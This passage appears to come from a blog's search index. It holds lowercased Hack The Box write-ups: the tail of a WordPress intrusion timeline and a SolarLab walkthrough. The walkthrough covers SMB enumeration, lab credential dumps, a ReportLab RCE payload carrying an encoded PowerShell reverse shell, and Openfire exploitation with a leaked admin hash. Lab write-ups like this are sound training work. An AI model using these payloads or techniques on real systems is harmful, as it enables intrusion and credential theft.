+0000 # user rules for ubuntu ubuntu all=(all) nopasswd:all timeline reconnaissance: on 2023-08-08 08:21:27 the ta started the scanner using ip 23.106.60.163.\nweaponization \u0026amp; delivery: on 2023-08-08 08:32:50 the ta identified the vulnerable wordpress plugin ultimate member v2.6.4.\nexploitation: on 2023-08-08 08:33:58 the ta successfully exploited cve-2023-3460 and added an admin user secragon.\ninstallation: on 2023-08-08 08:58:02 the ta created a reverse web shell /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php. the ta did this from an ip 198.16.74.45. after that, on 2023-08-08 09:06:53 the ta uploaded a bash script linenum.sh inside the /tmp folder then he moved it to the /dev/shm on 2023-08-08 09:32:38.\ncommand and control: the ta used ip 43.204.24.76 and port 6969 as a c2 server.\nremarks analyzing the log file indicates that the server was already compromised on 2023-08-07 13:50:25 by another threat actor who logged into the ssh account of ubuntu user from ip 203.101.190.9 using ssh key and created a backdoor admin account cyberjunkie_admin on 2023-08-07 13:55:36. the account seems to be dormant but that ta (203.101.190.9) also compromised the mysql database.\n","title":"HTB Sherlock Ultimatum"},{"date":"2024-05-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-machines/solarlab/","summary":"Solar Lab - HTB Nmap PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ Supported Methods: GET HEAD |_http-title: SolarLab Instant Messenger |_http-server-header: nginx/1.24.0 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds?","tags":["ctf","CVE-2023-32315","CVE-2023-33733","decryptor","htb","lab","openfire","PDF library","ReportLab","share","smb","solar","windows"],"text":"solar lab - htb nmap port state service reason version 80/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ supported methods: get head |_http-title: solarlab instant messenger |_http-server-header: nginx/1.24.0 135/tcp open msrpc syn-ack microsoft windows rpc 139/tcp open netbios-ssn syn-ack microsoft windows netbios-ssn 445/tcp open microsoft-ds? syn-ack 6791/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ supported methods: get head post options |_http-server-header: nginx/1.24.0 |_http-title: did not follow redirect to http://report.solarlab.htb:6791/ service info: os: windows; cpe: cpe:/o:microsoft:windows host script results: | smb2-time: | date: 2024-05-14t14:01:13 |_ start_date: n/a |_clock-skew: -5m11s | smb2-security-mode: | 3:1:1: |_ message signing enabled but not required | p2p-conficker: | checking for conficker.c or higher... | check 1 (port 64857/tcp): clean (timeout) | check 2 (port 37138/tcp): clean (timeout) | check 3 (port 48381/udp): clean (timeout) | check 4 (port 52237/udp): clean (timeout) |_ 0/4 checks are positive: host is clean or ports are blocked http enumeration http://report.solarlab.htb:6791\nunfortunately couldn\u0026rsquo;t log in, no credential was available.\nsmb enumeration message signing enabled but not required.\n$ smbclient --no-pass -l //10.10.11.16 sharename type comment --------- ---- ------- admin$ disk remote admin c$ disk default share documents disk ipc$ ipc remote ipc documents share was interesting so let\u0026rsquo;s connect and list the contents of it.\n$ smbclient --no-pass //10.10.11.16/documents try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . dr 0 fri apr 26 16:47:14 2024 .. dr 0 fri apr 26 16:47:14 2024 concepts d 0 fri apr 26 16:41:57 2024 desktop.ini ahs 278 fri nov 17 10:54:43 2023 details-file.xlsx a 12793 fri nov 17 12:27:21 2023 my music dhsrn 0 thu nov 16 19:36:51 2023 my pictures dhsrn 0 thu nov 16 19:36:51 2023 my videos dhsrn 0 thu nov 16 19:36:51 2023 old_leave_request_form.docx a 37194 fri nov 17 10:35:57 2023 7779839 blocks of size 4096. 1885790 blocks available smb: \\\u0026gt; there are some document files stored in the share. let\u0026rsquo;s download them and analyze.\nexif metadata analysis old_leave_request_form.docx\nexiftool version number : 12.76 file name : old_leave_request_form.docx directory : . file size : 37 kb file modification date/time : 2024:05:14 17:16:22+02:00 file access date/time : 2024:05:14 17:20:03+02:00 file inode change date/time : 2024:05:14 17:16:22+02:00 file permissions : -rw-r--r-- file type : docx file type extension : docx mime type : application/vnd.openxmlformats-officedocument.wordprocessingml.document zip required version : 20 zip bit flag : 0x0006 zip compression : deflated zip modify date : 1980:01:01 00:00:00 zip crc : 0x5c9ce90a zip compressed size : 483 zip uncompressed size : 2460 zip file name : [content_types].xml _newreviewcycle : creator : alison melville last modified by : jackie revision number : 3 create date : 2015:07:06 22:19:00z modify date : 2015:08:03 16:50:00z template : normal total edit time : 1 minute pages : 1 words : 142 characters : 814 application : microsoft office word doc security : none lines : 6 paragraphs : 1 scale crop : no heading pairs : title, 1 titles of parts : company : greig melville associates limited links up to date : no characters with spaces : 955 shared doc : no hyperlinks changed : no app version : 14.0000 details-file.xlsx\nexiftool version number : 12.76 file name : details-file.xlsx directory : . file size : 13 kb file modification date/time : 2024:05:14 17:16:11+02:00 file access date/time : 2024:05:14 17:21:24+02:00 file inode change date/time : 2024:05:14 17:16:11+02:00 file permissions : -rw-r--r-- file type : xlsx file type extension : xlsx mime type : application/vnd.openxmlformats-officedocument.spreadsheetml.sheet zip required version : 20 zip bit flag : 0x0006 zip compression : deflated zip modify date : 1980:01:01 00:00:00 zip crc : 0xd125f54a zip compressed size : 388 zip uncompressed size : 1681 zip file name : [content_types].xml creator : college of education last modified by : paul serban create date : 2011:03:24 14:38:51z modify date : 2023:11:17 12:27:21z application : microsoft excel doc security : none scale crop : no heading pairs : worksheets, 3 titles of parts : sheet1, sheet2, sheet3 company : purdue university links up to date : no shared doc : no hyperlinks changed : no app version : 16.0300 msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_enabled: true msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_setdate: 2023-11-17t10:41:19z msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_method: standard msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_name: all employees_2 msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_siteid: 33440fc6-b7c7-412c-bb73-0e70b0198d5a msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_actionid: c1afab2c-84d2-450d-9066-dcc727984137 msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_contentbits: 0 this file contains mip metadata which are part of microsoft information protection sdk - metadata. so it might contain some juicy informations.\ntraining-request-form.docx\nexiftool version number : 12.76 file name : training-request-form.docx directory : . file size : 161 kb file modification date/time : 2024:05:14 17:16:49+02:00 file access date/time : 2024:05:14 17:20:39+02:00 file inode change date/time : 2024:05:14 17:16:49+02:00 file permissions : -rw-r--r-- file type : docx file type extension : docx mime type : application/vnd.openxmlformats-officedocument.wordprocessingml.document zip required version : 20 zip bit flag : 0x0006 zip compression : deflated zip modify date : 1980:01:01 00:00:00 zip crc : 0xd2250c4f zip compressed size : 470 zip uncompressed size : 2223 zip file name : [content_types].xml creator : gayle.rennie last modified by : fryatt, susanne (wgpsn) revision number : 2 create date : 2018:07:20 08:11:00z modify date : 2018:07:20 08:11:00z template : normal.dotm total edit time : 44 minutes pages : 1 words : 188 characters : 1078 application : microsoft office word doc security : none lines : 8 paragraphs : 2 scale crop : no heading pairs : title, 1 titles of parts : company : wood group links up to date : no characters with spaces : 1264 shared doc : no hyperlinks changed : no app version : 14.0000 travel-request-sample.docx\nexiftool version number : 12.76 file name : travel-request-sample.docx directory : . file size : 31 kb file modification date/time : 2024:05:14 17:16:55+02:00 file access date/time : 2024:05:14 17:21:02+02:00 file inode change date/time : 2024:05:14 17:16:55+02:00 file permissions : -rw-r--r-- file type : docx file type extension : docx mime type : application/vnd.openxmlformats-officedocument.wordprocessingml.document zip required version : 20 zip bit flag : 0x0006 zip compression : deflated zip modify date : 1980:01:01 00:00:00 zip crc : 0x7d32bdda zip compressed size : 440 zip uncompressed size : 1997 zip file name : [content_types].xml title : subject : creator : paul squillace keywords : description : last modified by : katy brown revision number : 2 create date : 2015:06:14 14:49:00z modify date : 2015:06:14 14:49:00z template : normal.dotm total edit time : 1 minute pages : 1 words : 351 characters : 2003 application : microsoft macintosh word doc security : read-only enforced lines : 16 paragraphs : 4 scale crop : no heading pairs : title, 1 titles of parts : company : microsoft links up to date : no characters with spaces : 2350 shared doc : no hyperlinks changed : no app version : 14.0000 credentials the details-file.xlsx contained sensitive information.\npassword file\talexander\u0026#39;s ssn\t123-23-5424\tclaudia\u0026#39;s ssn\t820-378-3984\tblake\u0026#39;s ssn\t739-1846-436 site account# username password security question answer email other information amazon.com 101-333 alexander.knight@gmail.com al;ksdhfewoiuh what was your mother\u0026rsquo;s maiden name? blue alexander.knight@gmail.com pefcu a233j kalexander dkjafblkjadsfgl what was your high school mascot pine tree alexander.knight@gmail.com chase alexander.knight@gmail.com d398sadsknr390 what was the name of your first pet? corvette claudia.springer@gmail.com fidelity blake.byte thiscanb3typedeasily1@ what was your mother\u0026rsquo;s maiden name? helena\tblake@purdue.edu signa alexanderk danenacia9234n what was your mother\u0026rsquo;s maiden name? poppyseed muffins alexander.knight@gmail.com account number: 1925-47218-30 claudias dadsfawe9dafkn what was your mother\u0026rsquo;s maiden name? yellow crayon claudia.springer@gmail.com account number: 3872-03498-45 comcast jhg3434 vectren yuio576 verizon 1111-5555-33 with the above credentials i tried to login to the report.solarlab.htb:6791 and found a match. apparently, the username structure for this organization is firstname + lastname initial.\nthe matched credential is:\n**********:thiscanb3typedeasily1@ enumerating the report portal dashboard it was a portal for sending/approving leave request/vacation approval etc. after filling the form and uploading a image for attaching signature, ait generated a pdf file.\nexamining the generated pdf file with exiftool i discovered it was using reportlab pdf library.\nexiftool version number : 12.76 file name : output.pdf directory : . file size : 277 kb file modification date/time : 2024:05:14 19:24:09+02:00 file access date/time : 2024:05:14 19:24:09+02:00 file inode change date/time : 2024:05:14 19:24:09+02:00 file permissions : -rw-r--r-- file type : pdf file type extension : pdf mime type : application/pdf pdf version : 1.4 linearized : no author : (anonymous) create date : 2024:05:14 20:18:13-02:00 creator : (unspecified) modify date : 2024:05:14 20:18:13-02:00 producer : reportlab pdf library - www.reportlab.com subject : (unspecified) title : (anonymous) trapped : false page mode : usenone page count : 1 a quick search for this library resulted in that this library maybe (because i couldn\u0026rsquo;t determine the version of the library) vulnerable to an rce. read more about it on bleepingcomputer.\na publicly available poc was released on github.\nthe vulnerability was due to how it handled converting html to pdf (the flaw in xhtml2pdf).\npoc:\n\u0026lt;para\u0026gt; \u0026lt;font color=\u0026#34;[ [ getattr(pow,word(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;powershell -e jabjagwaaqblag4adaagad0aiaboaguadwatae8aygbqaguaywb0acaauwb5ahmadablag0algboaguadaauafmabwbjagsazqb0ahmalgbuaemauabdagwaaqblag4adaaoaciamqawac4amqawac4amqa2ac4anaa2acialaa5adaamaaxackaowakahmadabyaguayqbtacaapqagacqaywbsagkazqbuahqalgbhaguadabtahqacgblageabqaoackaowbbagiaeqb0aguawwbdaf0ajabiahkadablahmaiaa9acaamaauac4anga1aduamwa1ahwajqb7adaafqa7ahcaaabpagwazqaoacgajabpacaapqagacqacwb0ahiazqbhag0algbsaguayqbkacgajabiahkadablahmalaagadaalaagacqaygb5ahqazqbzac4atablag4azwb0aggakqapacaalqbuaguaiaawackaewa7acqazabhahqayqagad0aiaaoae4azqb3ac0atwbiagoazqbjahqaiaatafqaeqbwaguatgbhag0azqagafmaeqbzahqazqbtac4avablahgadaauaeeauwbdaekasqbfag4aywbvagqaaqbuagcakqauaecazqb0afmadabyagkabgbnacgajabiahkadablahmalaawacwaiaakagkakqa7acqacwblag4azabiageaywbracaapqagacgaaqblahgaiaakagqayqb0ageaiaayad4ajgaxacaafaagae8adqb0ac0auwb0ahiaaqbuagcaiaapadsajabzaguabgbkagiayqbjagsamgagad0aiaakahmazqbuagqaygbhagmaawagacsaiaaiafaauwagaciaiaaracaakabwahcazaapac4auabhahqaaaagacsaiaaiad4aiaaiadsajabzaguabgbkagiaeqb0aguaiaa9acaakabbahqazqb4ahqalgblag4aywbvagqaaqbuagcaxqa6adoaqqbtaemasqbjackalgbhaguadabcahkadablahmakaakahmazqbuagqaygbhagmaawayackaowakahmadabyaguayqbtac4avwbyagkadablacgajabzaguabgbkagiaeqb0agualaawacwajabzaguabgbkagiaeqb0agualgbmaguabgbnahqaaaapadsajabzahqacgblageabqauaeyabab1ahmaaaaoackafqa7acqaywbsagkazqbuahqalgbdagwabwbzaguakaapaa==\u0026#39;) for word in [orgtypefun(\u0026#39;word\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: false, \u0026#39;__eq__\u0026#39;: lambda self,x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self: {setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1)}, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)) })] ] for orgtypefun in [type(type(1))] ] and \u0026#39;red\u0026#39;\u0026#34;\u0026gt; exploit \u0026lt;/font\u0026gt; \u0026lt;/para\u0026gt; delivery:\nthe justification field is limited by 300 characters so it cannot be used also we cannot attach html file. and the date section is accepts date range. so that leaves ome_office_request parameter to deliver the payload.\nfoothold we got a shell as blake and our user flag.\nprivesc enumeration i found a sqlite database inside the app/instance directory.\nusers.db\n1\tblakeb\tthiscanb3typedeasily1@ 2\tclaudias\t007poiuytrewq 3\talexanderk\thotp!fireguard current user info\nuser information ---------------- user name sid ============== ============================================== solarlab\\blake s-1-5-21-3606151065-2641007806-2768514320-1000 group information ----------------- group name type sid attributes ====================================== ================ ============ ================================================== everyone well-known group s-1-1-0 mandatory group, enabled by default, enabled group builtin\\users alias s-1-5-32-545 mandatory group, enabled by default, enabled group nt authority\\batch well-known group s-1-5-3 mandatory group, enabled by default, enabled group console logon well-known group s-1-2-1 mandatory group, enabled by default, enabled group nt authority\\authenticated users well-known group s-1-5-11 mandatory group, enabled by default, enabled group nt authority\\this organization well-known group s-1-5-15 mandatory group, enabled by default, enabled group nt authority\\local account well-known group s-1-5-113 mandatory group, enabled by default, enabled group local well-known group s-1-2-0 mandatory group, enabled by default, enabled group nt authority\\ntlm authentication well-known group s-1-5-64-10 mandatory group, enabled by default, enabled group mandatory label\\medium mandatory level label s-1-16-8192 privileges information ---------------------- privilege name description state ============================= ==================================== ======== seshutdownprivilege shut down the system disabled sechangenotifyprivilege bypass traverse checking enabled seundockprivilege remove computer from docking station disabled seincreaseworkingsetprivilege increase a process working set disabled setimezoneprivilege change the time zone disable active connections - listening\ntcp 0.0.0.0:80 0.0.0.0:0 listening 4960 tcp 0.0.0.0:135 0.0.0.0:0 listening 896 tcp 0.0.0.0:445 0.0.0.0:0 listening 4 tcp 0.0.0.0:5040 0.0.0.0:0 listening 6008 tcp 0.0.0.0:5985 0.0.0.0:0 listening 4 tcp 0.0.0.0:6791 0.0.0.0:0 listening 4960 tcp 0.0.0.0:47001 0.0.0.0:0 listening 4 tcp 0.0.0.0:49664 0.0.0.0:0 listening 660 tcp 0.0.0.0:49665 0.0.0.0:0 listening 528 tcp 0.0.0.0:49666 0.0.0.0:0 listening 728 tcp 0.0.0.0:49667 0.0.0.0:0 listening 1564 tcp 0.0.0.0:49668 0.0.0.0:0 listening 652 tcp 10.10.11.16:139 0.0.0.0:0 listening 4 tcp 127.0.0.1:5000 0.0.0.0:0 listening 852 tcp 127.0.0.1:5222 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5223 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5262 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5263 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5269 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5270 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5275 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5276 0.0.0.0:0 listening 2996 tcp 127.0.0.1:7070 0.0.0.0:0 listening 2996 tcp 127.0.0.1:7443 0.0.0.0:0 listening 2996 tcp 127.0.0.1:9090 0.0.0.0:0 listening 2996 tcp 127.0.0.1:9091 0.0.0.0:0 listening 2996 tcp [::]:135 [::]:0 listening 896 tcp [::]:445 [::]:0 listening 4 tcp [::]:5985 [::]:0 listening 4 tcp [::]:47001 [::]:0 listening 4 tcp [::]:49664 [::]:0 listening 660 tcp [::]:49665 [::]:0 listening 528 tcp [::]:49666 [::]:0 listening 728 tcp [::]:49667 [::]:0 listening 1564 tcp [::]:49668 [::]:0 listening 652 running services on local interface\nget-process -id 2996 handles npm(k) pm(k) ws(k) cpu(s) id si processname ------- ------ ----- ----- ------ -- -- ----------- 967 87 318252 212752 2996 0 openfire-service users on the local machine\nuser accounts for \\\\solarlab ------------------------------------------------------------------------------- administrator blake defaultaccount guest openfire wdagutilityaccount openfire 4.7.4\nopenfire is running on port 9090 let\u0026rsquo;s use chisel to forward the port.\nopenfire version was 4.7.4 vulnerable to admin account takeover. poc\nafter successful exploitation got a shell as openfire. testing credentials using the users.db i found a match.\nopenfire:******** found a script inside embedded-db folder.\nopenfire.properties\nset database unique name hsqldb8bdd3b2742 set database gc 0 set database default result memory rows 0 set database event log level 0 set database transaction control locks set database default isolation level read committed set database transaction rollback on conflict true set database text table defaults \u0026#39;\u0026#39; set database sql names false set database sql references false set database sql size true set database sql types false set database sql tdc delete true set database sql tdc update true set database sql concat nulls true set database sql unique nulls true set database sql convert truncate true set database sql avg scale 0 set database sql double nan true set files write delay 1 set files backup increment true set files cache size 10000 set files cache rows 50000 set files scale 32 set files lob scale 32 set files defrag 0 set files nio true set files nio size 256 set files log true set files log size 20 create user sa password digest \u0026#39;d41d8cd98f00b204e9800998ecf8427e\u0026#39; alter user sa set local true create schema public authorization dba set schema public create memory table public.ofuser(username varchar(64) not null,storedkey varchar(32),serverkey varchar(32),salt varchar(32),iterations integer,plainpassword varchar(32),encryptedpassword varchar(255),name varchar(100),email varchar(100),creationdate varchar(15) not null,modificationdate varchar(15) not null,constraint ofuser_pk primary key(username)) create index ofuser_cdate_idx on public.ofuser(creationdate) create memory table public.ofuserprop(username varchar(64) not null,name varchar(100) not null,propvalue varchar(4000) not null,constraint ofuserprop_pk primary key(username,name)) create memory table public.ofuserflag(username varchar(64) not null,name varchar(100) not null,starttime varchar(15),endtime varchar(15),constraint ofuserflag_pk primary key(username,name)) create index ofuserflag_stime_idx on public.ofuserflag(starttime) create index ofuserflag_etime_idx on public.ofuserflag(endtime) create memory table public.ofoffline(username varchar(64) not null,messageid bigint not null,creationdate varchar(15) not null,messagesize integer not null,stanza varchar(16777216) not null,constraint ofoffline_pk primary key(username,messageid)) create memory table public.ofpresence(username varchar(64) not null,offlinepresence varchar(16777216),offlinedate varchar(15) not null,constraint ofpresence_pk primary key(username)) create memory table public.ofroster(rosterid bigint not null,username varchar(64) not null,jid varchar(1024) not null,sub integer not null,ask integer not null,recv integer not null,nick varchar(255),stanza varchar(16777216),constraint ofroster_pk primary key(rosterid)) create index ofroster_username_idx on public.ofroster(username) create index ofroster_jid_idx on public.ofroster(jid) create memory table public.ofrostergroups(rosterid bigint not null,rank integer not null,groupname varchar(255) not null,constraint ofrostergroups_pk primary key(rosterid,rank)) create index ofrostergroup_rosterid_idx on public.ofrostergroups(rosterid) create memory table public.ofvcard(username varchar(64) not null,vcard varchar(16777216) not null,constraint ofvcard_pk primary key(username)) create memory table public.ofgroup(groupname varchar(50) not null,description varchar(255),constraint ofgroup_pk primary key(groupname)) create memory table public.ofgroupprop(groupname varchar(50) not null,name varchar(100) not null,propvalue varchar(4000) not null,constraint ofgroupprop_pk primary key(groupname,name)) create memory table public.ofgroupuser(groupname varchar(50) not null,username varchar(100) not null,administrator integer not null,constraint ofgroupuser_pk primary key(groupname,username,administrator)) create memory table public.ofid(idtype integer not null,id bigint not null,constraint ofid_pk primary key(idtype)) create memory table public.ofproperty(name varchar(100) not null,propvalue varchar(4000) not null,encrypted integer,iv character(24),constraint ofproperty_pk primary key(name)) create memory table public.ofversion(name varchar(50) not null,version integer not null,constraint ofversion_pk primary key(name)) create memory table public.ofextcomponentconf(subdomain varchar(255) not null,wildcard integer not null,secret varchar(255),permission varchar(10) not null,constraint ofextcomponentconf_pk primary key(subdomain)) create memory table public.ofremoteserverconf(xmppdomain varchar(255) not null,remoteport integer,permission varchar(10) not null,constraint ofremoteserverconf_pk primary key(xmppdomain)) create memory table public.ofprivacylist(username varchar(64) not null,name varchar(100) not null,isdefault integer not null,list varchar(16777216) not null,constraint ofprivacylist_pk primary key(username,name)) create index ofprivacylist_default_idx on public.ofprivacylist(username,isdefault) create memory table public.ofsaslauthorized(username varchar(64) not null,principal varchar(4000) not null,constraint ofsaslauthorized_pk primary key(username,principal)) create memory table public.ofsecurityauditlog(msgid bigint not null,username varchar(64) not null,entrystamp bigint not null,summary varchar(255) not null,node varchar(255) not null,details varchar(16777216),constraint ofsecurityauditlog_pk primary key(msgid)) create index ofsecurityauditlog_tstamp_idx on public.ofsecurityauditlog(entrystamp) create index ofsecurityauditlog_uname_idx on public.ofsecurityauditlog(username) create memory table public.ofmucservice(serviceid bigint not null,subdomain varchar(255) not null,description varchar(255),ishidden integer not null,constraint ofmucservice_pk primary key(subdomain)) create index ofmucservice_serviceid_idx on public.ofmucservice(serviceid) create memory table public.ofmucserviceprop(serviceid bigint not null,name varchar(100) not null,propvalue varchar(4000) not null,constraint ofmucserviceprop_pk primary key(serviceid,name)) create memory table public.ofmucroom(serviceid bigint not null,roomid bigint not null,creationdate character(15) not null,modificationdate character(15) not null,name varchar(50) not null,naturalname varchar(255) not null,description varchar(255),lockeddate character(15) not null,emptydate character(15),canchangesubject integer not null,maxusers integer not null,publicroom integer not null,moderated integer not null,membersonly integer not null,caninvite integer not null,roompassword varchar(50),candiscoverjid integer not null,logenabled integer not null,subject varchar(100),rolestobroadcast integer not null,usereservednick integer not null,canchangenick integer not null,canregister integer not null,allowpm integer,fmucenabled integer,fmucoutboundnode varchar(255),fmucoutboundmode integer,fmucinboundnodes varchar(4000),constraint ofmucroom_pk primary key(serviceid,name)) create index ofmucroom_roomid_idx on public.ofmucroom(roomid) create index ofmucroom_serviceid_idx on public.ofmucroom(serviceid) create memory table public.ofmucroomprop(roomid bigint not null,name varchar(100) not null,propvalue varchar(4000) not null,constraint ofmucroomprop_pk primary key(roomid,name)) create memory table public.ofmucaffiliation(roomid bigint not null,jid varchar(1024) not null,affiliation integer not null,constraint ofmucaffiliation_pk primary key(roomid,jid)) create memory table public.ofmucmember(roomid bigint not null,jid varchar(1024) not null,nickname varchar(255),firstname varchar(100),lastname varchar(100),url varchar(100),email varchar(100),faqentry varchar(100),constraint ofmucmember_pk primary key(roomid,jid)) create memory table public.ofmucconversationlog(roomid bigint not null,messageid bigint not null,sender varchar(1024) not null,nickname varchar(255),logtime character(15) not null,subject varchar(255),body varchar(16777216),stanza varchar(16777216)) create index ofmucconversationlog_roomtime_idx on public.ofmucconversationlog(roomid,logtime) create index ofmucconversationlog_time_idx on public.ofmucconversationlog(logtime) create index ofmucconversationlog_msg_id on public.ofmucconversationlog(messageid) create memory table public.ofpubsubnode(serviceid varchar(100) not null,nodeid varchar(100) not null,leaf integer not null,creationdate character(15) not null,modificationdate character(15) not null,parent varchar(100),deliverpayloads integer not null,maxpayloadsize integer,persistitems integer,maxitems integer,notifyconfigchanges integer not null,notifydelete integer not null,notifyretract integer not null,presencebased integer not null,senditemsubscribe integer not null,publishermodel varchar(15) not null,subscriptionenabled integer not null,configsubscription integer not null,accessmodel varchar(10) not null,payloadtype varchar(100),bodyxslt varchar(100),dataformxslt varchar(100),creator varchar(1024) not null,description varchar(255),language varchar(255),name varchar(50),replypolicy varchar(15),associationpolicy varchar(15),maxleafnodes integer,constraint ofpubsubnode_pk primary key(serviceid,nodeid)) create memory table public.ofpubsubnodejids(serviceid varchar(100) not null,nodeid varchar(100) not null,jid varchar(1024) not null,associationtype varchar(20) not null,constraint ofpubsubnodejids_pk primary key(serviceid,nodeid,jid)) create memory table public.ofpubsubnodegroups(serviceid varchar(100) not null,nodeid varchar(100) not null,rostergroup varchar(100) not null) create index ofpubsubnodegroups_idx on public.ofpubsubnodegroups(serviceid,nodeid) create memory table public.ofpubsubaffiliation(serviceid varchar(100) not null,nodeid varchar(100) not null,jid varchar(1024) not null,affiliation varchar(10) not null,constraint ofpubsubaffiliation_pk primary key(serviceid,nodeid,jid)) create memory table public.ofpubsubitem(serviceid varchar(100) not null,nodeid varchar(100) not null,id varchar(100) not null,jid varchar(1024) not null,creationdate character(15) not null,payload clob(1g),constraint ofpubsubitem_pk primary key(serviceid,nodeid,id)) create memory table public.ofpubsubsubscription(serviceid varchar(100) not null,nodeid varchar(100) not null,id varchar(100) not null,jid varchar(1024) not null,owner varchar(1024) not null,state varchar(15) not null,deliver integer not null,digest integer not null,digest_frequency integer not null,expire character(15),includebody integer not null,showvalues varchar(30) not null,subscriptiontype varchar(10) not null,subscriptiondepth integer not null,keyword varchar(200),constraint ofpubsubsubscription_pk primary key(serviceid,nodeid,id)) create memory table public.ofpubsubdefaultconf(serviceid varchar(100) not null,leaf integer not null,deliverpayloads integer not null,maxpayloadsize integer not null,persistitems integer not null,maxitems integer not null,notifyconfigchanges integer not null,notifydelete integer not null,notifyretract integer not null,presencebased integer not null,senditemsubscribe integer not null,publishermodel varchar(15) not null,subscriptionenabled integer not null,accessmodel varchar(10) not null,language varchar(255),replypolicy varchar(15),associationpolicy varchar(15) not null,maxleafnodes integer not null,constraint ofpubsubdefaultconf_pk primary key(serviceid,leaf)) alter sequence system_lobs.lob_id restart with 1 set database default initial schema public grant usage on domain information_schema.sql_identifier to public grant usage on domain information_schema.yes_or_no to public grant usage on domain information_schema.time_stamp to public grant usage on domain information_schema.cardinal_number to public grant usage on domain information_schema.character_data to public grant dba to sa set schema system_lobs insert into blocks values(0,2147483647,0) set schema public insert into ofuser values(\u0026#39;admin\u0026#39;,\u0026#39;gjmoswpk+hakpdvlivp6elklyh0=\u0026#39;,\u0026#39;9mwnqcj9bf4yeyzddns5gvxp620=\u0026#39;,\u0026#39;yidqk5skw11qjwtbaloab28lyhftqa0x\u0026#39;,4096,null,\u0026#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#39;,\u0026#39;administrator\u0026#39;,\u0026#39;admin@solarlab.htb\u0026#39;,\u0026#39;001700223740785\u0026#39;,\u0026#39;0\u0026#39;) insert into ofuserprop values(\u0026#39;admin\u0026#39;,\u0026#39;console.rows_per_page\u0026#39;,\u0026#39;/session-summary.jsp=25\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,1,\u0026#39;001700223778861\u0026#39;,127,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: openfire 4.7.5\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,2,\u0026#39;001700223779069\u0026#39;,125,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: search 1.7.4\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,6,\u0026#39;001714131992714\u0026#39;,127,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: openfire 4.8.1\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,7,\u0026#39;001714131993136\u0026#39;,125,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: search 1.7.4\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,11,\u0026#39;001715023572659\u0026#39;,127,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: openfire 4.8.1\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,12,\u0026#39;001715023572956\u0026#39;,125,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: search 1.7.4\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofid values(18,1) insert into ofid values(19,16) insert into ofid values(23,1) insert into ofid values(25,3) insert into ofid values(26,2) insert into ofid values(27,1) insert into ofproperty values(\u0026#39;cache.mucservice\u0026#39;\u0026#39;conference\u0026#39;\u0026#39;roomstatistics.maxlifetime\u0026#39;,\u0026#39;-1\u0026#39;,0,null) insert into ofproperty values(\u0026#39;cache.mucservice\u0026#39;\u0026#39;conference\u0026#39;\u0026#39;roomstatistics.size\u0026#39;,\u0026#39;-1\u0026#39;,0,null) insert into ofproperty values(\u0026#39;cache.mucservice\u0026#39;\u0026#39;conference\u0026#39;\u0026#39;rooms.maxlifetime\u0026#39;,\u0026#39;-1\u0026#39;,0,null) insert into ofproperty 